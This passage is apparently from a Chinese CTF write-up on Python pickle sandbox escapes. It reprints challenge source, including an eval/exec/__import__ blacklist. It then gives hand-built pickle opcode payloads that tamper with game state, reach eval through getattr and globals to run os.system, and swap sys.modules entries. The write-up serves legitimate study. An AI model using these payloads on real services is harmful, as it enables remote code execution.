<span class="string">"Congratulations, you get the right number!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">"Wrong number, better luck next time."</span></span><br><span class="line">    print(text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> game.is_win():</span><br><span class="line">        text = <span class="string">"Game over! You win all the rounds, here is your flag %s"</span> % flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">"Game over! You got %d/%d."</span> % (game.win_count, game.round_count)</span><br><span class="line">    print(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># file: RestrictedUnpickler.py  对引入的模块进行检测</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"guess_game"</span> == module[<span class="number">0</span>:<span class="number">10</span>] <span class="keyword">and</span> <span class="string">"__"</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure>
+
+<p>server 端将接收到的数据进行反序列，这里与常规的 <code>pickle.loads</code> 不同，采用的是 Python 提供的<a href="https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals" target="_blank" rel="noopener">安全措施</a>。也就是说，导入的模块只能以 <code>guess_name</code> 开头，并且名称里不能含有 <code>__</code>。</p>
+<p>最初的想法还是想执行命令，只是做题的话完全不需要这么折腾，先来看一下判赢规则。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: Game.py</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> max_round, number_range</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count = <span class="number">0</span></span><br><span class="line">        self.win_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_game</span><span class="params">(self, ticket)</span>:</span></span><br><span class="line">        win = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> self.curr_ticket == ticket:</span><br><span class="line">            self.win_count += <span class="number">1</span></span><br><span class="line">            win = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> win</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finished</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.round_count &gt;= max_round</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_win</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.win_count == max_round</span><br></pre></td></tr></table></figure>
+
+<p>只要能控制住 <code>curr_ticket</code>，每局就能稳赢，或者直接将 <code>win_count</code> 设为 10，能实现吗？</p>
+<p><strong>先试试覆盖 <code>win_count</code> 和 <code>round_count</code></strong>。换句话来说，就是需要在反序列化 Ticket 对象前执行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game  <span class="comment"># __init__.py  game = Game()</span></span><br><span class="line">game.round_count = <span class="number">10</span></span><br><span class="line">game.win_count = <span class="number">10</span></span><br></pre></td></tr></table></figure>
+
+<p>pickle 里并不能直接用等号赋值，但有对应的指令用来改变属性。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BUILD = <span class="string">b'b'</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line"><span class="comment"># 具体实现在 pickle.py 的 1546 行</span></span><br></pre></td></tr></table></figure>
+
+<p>开始构造</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cguess_game</span><br><span class="line">game</span><br><span class="line">&#125;S'round_count'</span><br><span class="line">I10</span><br><span class="line">sS'win_count'</span><br><span class="line">I10</span><br><span class="line">sb</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>}</code> 是往 stack 中压入一个空 dict，<code>s</code> 是将键值对插入到 dict。</p>
+<p>测试一下效果，成功。</p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7yxg3sbn9j20pj062wew.jpg" alt="image.png"></p>
+<p>到这就做完了吗？不，还有个小验证，<code>assert type(ticket) == Ticket</code>。</p>
+<p>之前提到过，<code>pickle</code> 序列流执行完后将把栈顶的值返回，那结尾再留一个 <code>Ticket</code> 的对象就好了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ticket = Ticket(<span class="number">6</span>)</span><br><span class="line">res = pickle.dumps(ticket)  <span class="comment"># 这里不能再用 0 号协议，否则会出现 ccopy_reg\n_reconstructor</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+
+<p>最终 payload：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span>game<span class="symbol">\n</span>&#125;S"win_count"<span class="symbol">\n</span>I10<span class="symbol">\n</span>sS"round_count"<span class="symbol">\n</span>I9<span class="symbol">\n</span>sbcguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>06sb.</span><br></pre></td></tr></table></figure>
+
+<p><strong>尝试覆盖掉 <code>current_ticket</code></strong>：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span></span><br><span class="line">game</span><br><span class="line">&#125;S'curr_ticket'</span><br><span class="line">cguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>06sbp0</span><br><span class="line">sbg0</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+
+<p>这里用了一下 memo，存储了 ticket 对象，再拿出来放到栈顶。</p>
+<p>最终 payload：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span>game<span class="symbol">\n</span>&#125;S'curr_ticket'<span class="symbol">\n</span>cguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>07sbp0<span class="symbol">\n</span>sbg0<span class="symbol">\n</span>.</span><br></pre></td></tr></table></figure>
+
+<h3 id="Code-Breaking-2018-picklecode"><a href="#Code-Breaking-2018-picklecode" class="headerlink" title="Code-Breaking 2018 picklecode"></a>Code-Breaking 2018 picklecode</h3><blockquote>
+<p>完整源码： <a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/blob/master/2018/picklecode</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">__all__ = (<span class="string">'PickleSerializer'</span>, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    blacklist = &#123;<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleSerializer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> isinstance(data, str):</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">"Can't load pickle from unicode string"</span>)</span><br><span class="line">            file = io.BytesIO(data)</span><br><span class="line">            <span class="keyword">return</span> RestrictedUnpickler(file,</span><br><span class="line">                              encoding=<span class="string">'ASCII'</span>, errors=<span class="string">'strict'</span>).load()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这只是原题的一部分，重点关注下这个沙箱如何逃逸。先看个东西：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(globals()[<span class="string">'__builtins__'</span>], <span class="string">'eval'</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br><span class="line"></span><br><span class="line">&lt;=&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(dict.get(globals(), <span class="string">'__builtins__'</span>), <span class="string">'eval'</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>getattr</code> 和 <code>globals</code> 并没有被禁，那就尝试写 pickle 吧。</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(<span class="name">cbuiltins</span></span><br><span class="line">dict</span><br><span class="line">S'get'</span><br><span class="line">tRp100</span><br><span class="line">(<span class="name">cbuiltins</span></span><br><span class="line">globals</span><br><span class="line">(<span class="name">tRS</span>'__builtins__'</span><br><span class="line">tRp101</span><br><span class="line"><span class="number">0</span>g100</span><br><span class="line">(<span class="name">g101</span></span><br><span class="line">S'eval'</span><br><span class="line">tR(<span class="name">S</span>'__import__(<span class="string">"os"</span>).system(<span class="string">"dir"</span>)'</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
+
+<p>PS：我的环境是 Python 3.7.4，反序列化时获取到的 <code>builtins</code> 是一个 <code>dict</code>，所以用了两次 <code>get</code>，视环境进行调整吧。这个 payload 在 Python 3.7.3 又跑不起来 ：）</p>
+<h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3><blockquote>
+<p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle, io</span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'sys'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure>
+
+<p>限制了导入的模块只能是 <code>sys</code>，问题是这个模块也不安全呀 ：）</p>
+<blockquote>
+<p><code>sys.modules</code></p>
+<p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail.</p>
+</blockquote>
+<p>如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库是默认被加载进来的，例如 <code>os</code>，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。 </p>
+<p>这里的 <code>find_class</code> 直接调的 pickle.py 中的方法，那就先看看它如何导入包的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pickle.Unpickler.find_class</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">    <span class="comment"># Subclasses may override this.</span></span><br><span class="line">    <span class="keyword">if</span> self.proto &lt; <span class="number">3</span> <span class="keyword">and</span> self.fix_imports:</span><br><span class="line">        <span class="keyword">if</span> (module, name) <span class="keyword">in</span> _compat_pickle.NAME_MAPPING:</span><br><span class="line">            module, name = _compat_pickle.NAME_MAPPING[(module, name)]</span><br><span class="line">        <span class="keyword">elif</span> module <span class="keyword">in</span> _compat_pickle.IMPORT_MAPPING:</span><br><span class="line">            module = _compat_pickle.IMPORT_MAPPING[module]</span><br><span class="line">    __import__(module, level=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> self.proto &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> _getattribute(sys.modules[module], name)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>sys.modules</code> 为：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;	</span><br><span class="line">    'sys': &lt; module 'sys'(built - in ) &gt; ,</span><br><span class="line">    'builtins': &lt; module 'builtins'(built - in ) &gt; ,</span><br><span class="line">    'os': &lt; module 'os'</span><br><span class="line">    from 'C:\\Users\\wywwzjj\\AppData\\Local\\Programs\\Python\\Python37\\lib\\os.py' &gt; ,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那我们的目标：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cos\nsystem  &lt;=&gt; getattr(sys.modules['os'], 'system')</span><br></pre></td></tr></table></figure>
+
+<p>限制了 module 只能为 sys，那能否把 <code>sys.modules[&#39;sys&#39;]</code>替换为<code>sys.modules[&#39;os&#39;]</code>，从而引入危险模块。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules</span><br><span class="line">modules[<span class="string">'sys'</span>] = modules[<span class="string">'os'</span>]</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> system</span><br></pre></td></tr></table></figure>
+
+<p>本地实验一下，成功：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\wywwzjj&gt; python</span><br><span class="line">Python <span class="number">3.7</span>.<span class="number">4</span> (tags/v3.<span class="number">7.4</span>:e09359112e, Jul  <span class="number">8</span> <span class="number">2019</span>, <span class="number">20</span>:<span class="number">34</span>:<span class="number">20</span>) [MSC v.<span class="number">1916</span> <span class="number">64</span> bit (AMD64)] on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; from sys import modules</span><br><span class="line">&gt;&gt;&gt; modules[<span class="string">'sys'</span>] = modules[<span class="string">'os'</span>]</span><br><span class="line">&gt;&gt;&gt; from sys import system</span><br><span class="line">&gt;&gt;&gt; system(<span class="string">'dir'</span>)</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F497-F727</span><br><span class="line"></span><br><span class="line"> C:\Users\wywwzjj 的目录</span><br><span class="line"></span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">2019</span>/<span class="number">08</span>/<span class="number">22</span>  <span class="number">21</span>:<span class="number">02</span>             <span class="number">2</span>,<span class="number">750</span> <span class="selector-class">.aggressor</span><span class="selector-class">.prop</span></span><br><span class="line"><span class="number">2019</span>/<span class="number">09</span>/<span class="number">16</span>  <span class="number">00</span>:<span class="number">09</span>    &lt;DIR&gt;          .anaconda</span><br><span class="line"><span class="number">2019</span>/<span class="number">04</span>/<span class="number">09</span>  <span class="number">13</span>:<span class="number">58</span>    &lt;DIR&gt;          .android</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">13</span>  <span class="number">14</span>:<span class="number">37</span>    &lt;DIR&gt;          .astropy</span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>            <span class="number">18</span>,<span class="number">465</span> .bash_history</span><br><span class="line"><span class="number">2019</span>/<span class="number">04</span>/<span class="number">07</span>  <span class="number">12</span>:<span class="number">03</span>    &lt;DIR&gt;          <span class="selector-class">.CLion2019</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>还有个小麻烦，<code>modules</code> 是个 <code>dict</code>，无法直接取值。继续利用 <code>getattr(sys.modules[module], name)</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">'sys'</span>] = sys.modules</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(sys)  <span class="comment"># 成功导入 dict 对象</span></span><br><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__delitem__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__setitem__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'clear'</span>, <span class="string">'copy'</span>, <span class="string">'fromkeys'</span>, <span class="string">'get'</span>, <span class="string">'items'</span>, <span class="string">'keys'</span>, <span class="string">'pop'</span>, <span class="string">'popitem'</span>, <span class="string">'setdefault'</span>, <span class="string">'update'</span>, <span class="string">'values'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(sys, <span class="string">'get'</span>)  <span class="comment"># 结合 find_class 中的 getattr</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> method get of dict object at <span class="number">0x000002622D052688</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>改写成 pickle：</p>
